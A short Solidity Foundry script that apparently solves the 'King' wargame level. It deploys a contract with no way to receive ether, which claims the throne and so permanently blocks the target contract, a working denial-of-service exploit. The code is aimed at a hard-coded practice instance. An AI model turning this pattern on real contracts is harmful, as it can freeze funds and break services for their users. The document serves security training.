// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {King} from "src/King/King.sol";
import {Script} from "lib/forge-std/src/Script.sol";
import {console} from "lib/forge-std/src/console.sol";

contract TheLastKing {
    constructor(King _kingInstance) payable {
        address(_kingInstance).call{value: _kingInstance.prize()}("");
    }
}

contract KingSolution is Script {
    King public kingInstance = King(payable(0xE2715Afa2D7E619bC55c768f6CEDE325c9e68779));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new TheLastKing{value: kingInstance.prize()}(kingInstance);
        vm.stopBroadcast();
    }
}
